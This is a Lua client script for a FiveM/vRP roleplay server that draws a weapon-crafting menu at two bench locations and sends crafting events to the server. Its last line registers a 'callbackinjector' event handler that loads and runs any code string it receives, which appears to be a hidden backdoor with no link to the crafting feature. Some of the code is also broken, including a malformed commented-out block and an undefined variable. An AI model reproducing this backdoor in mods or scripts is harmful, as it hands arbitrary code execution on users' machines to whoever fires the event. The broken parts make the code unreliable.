local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")

oC = Tunnel.getInterface("rush_craftweapon")
-------------------------------------------------------------------------------------------------
--[ LOCAL ]--------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
local prodMachine = {
	{ ['x'] = 1272.04, ['y'] = -1712.06, ['z'] = 54.78 },
	{ ['x'] = -1077.89, ['y'] = -1675.82, ['z'] = 4.58 }
}
-------------------------------------------------------------------------------------------------
--[ MENU ]---------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
local menuactive = false
local onmenu = false

function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		TransitionToBlurred(1000)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		TransitionFromBlurred(1000)
		SendNUIMessage({ hidemenu = true })
	end
end
-------------------------------------------------------------------------------------------------
--[ BOTÕES ]-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	[if data == "produzir-g36" then
		TriggerServerEvent("produzir-armas","g36")

	elseif data == "produzir-sawnoffshotgun" then
		TriggerServerEvent("produzir-armas","sawnoffshotgun")--]]

	if data == "produzir-five" then
		TriggerServerEvent("produzir-armas","fiveseven")

	elseif data == "produzir-sns" then
		TriggerServerEvent("produzir-armas","sns")

	elseif data == "fechar" then
		ToggleActionMenu()
		onmenu = false
	end
end)

RegisterNetEvent("bancada-armas:posicao")
AddEventHandler("bancada-armas:posicao", function()
	local ped = PlayerPedId()
--	SetEntityHeading(ped,270.89)
--	SetEntityCoords(ped,1405.96,1137.86,109.75-1,false,false,false,false)
end)

RegisterNetEvent("fechar-nuis")
AddEventHandler("fechar-nuis", function()
	ToggleActionMenu()
	onmenu = false
end)
-------------------------------------------------------------------------------------------------
--[ AÇÃO ]---------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local toddy = 1000

		for k,v in pairs(prodMachine) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			local prodMachine = prodMachine[k]
			local idBancada = prodMachine[id]

			if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), prodMachine.x, prodMachine.y, prodMachine.z, true ) <= 1 and not onmenu then
				toddy = 3
				drawTxt("PRESSIONE  ~o~E~w~  PARA INICIAR A PRODUÇÃO",4,0.08,0.55,0.45,255,255,255,180)
			end
			if distance <= 1.2 then
				toddy = 3
				if IsControlJustPressed(0,38) and oC.checkPermissao() then
					ToggleActionMenu()
					onmenu = true
				end
			end
		end
		Citizen.Wait(toddy)
	end
end)
-------------------------------------------------------------------------------------------------
--[ FUNÇÃO ]-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function DrawText3D(x, y, z, text)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    
    SetTextScale(0.28, 0.28)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(_x,_y)
    local factor = (string.len(text)) / 370
    DrawRect(_x,_y+0.0125, 0.005+ factor, 0.03, 41, 11, 41, 68)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)